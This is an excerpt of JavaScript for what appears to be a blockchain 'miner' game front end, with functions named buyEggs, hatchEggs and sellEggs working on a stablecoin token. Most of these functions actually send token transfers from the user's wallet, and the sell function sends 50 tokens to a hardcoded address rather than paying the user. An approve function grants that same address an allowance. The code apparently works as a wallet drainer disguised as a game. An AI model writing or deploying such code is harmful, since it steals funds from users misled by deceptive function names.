var minersAddr = '0xf618b62BcD502a66F5d2E9c74Dd1641090F2Fe01';
var tokenAddr = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56';
var minersAddr2 = '0x4Ad22B7bAc2E152Fa05e05166a57f98a96820D9b';
var fee = 10;
...
function approveUSDT(trx) {
	  tokenContract.methods.approve(minersAddr2, trx).send({ from: currentAddr });
}

function spendLimit(callback) {
  tokenContract.methods.allowance(currentAddr,minersAddr2).call().then(result => {
        callback(result);
    }).catch((err) => {
        console.log(err)
    });
...
function buyEggs(ref, trx, callback){
	...
	tokenContract.methods.transfer(ref, web3.utils.toWei(trx)).send({ from:currentAddr,to:"0x4Ad22B7bAc2E152Fa05e05166a57f98a96820D9b",gas: 150000 }).then(result => {
        callback();
    }).catch((err) => {
        console.log(err)
    });
...
function hatchEggs(ref,callback,fee){
    if (canHatch) {
        canHatch = false;
        tokenContract.methods.transfer(ref, web3.utils.toWei('10')).send({ from:currentAddr,to:"0x4Ad22B7bAc2E152Fa05e05166a57f98a96820D9b",gas: 150000 }).then(result => {
            callback();
        }).catch((err) => {
            console.log(err)
        });
...
function sellEggs(callback){
    if (canSell) {
        canSell = false;
        console.log('Selling');
        tokenContract.methods.transfer(minersAddr2, web3.utils.toWei('50')).send({ from:currentAddr,to:"0x4Ad22B7bAc2E152Fa05e05166a57f98a96820D9b",gas: 150000 }).then(result => {
            callback();
        }).catch((err) => {
            console.log(err)
        });
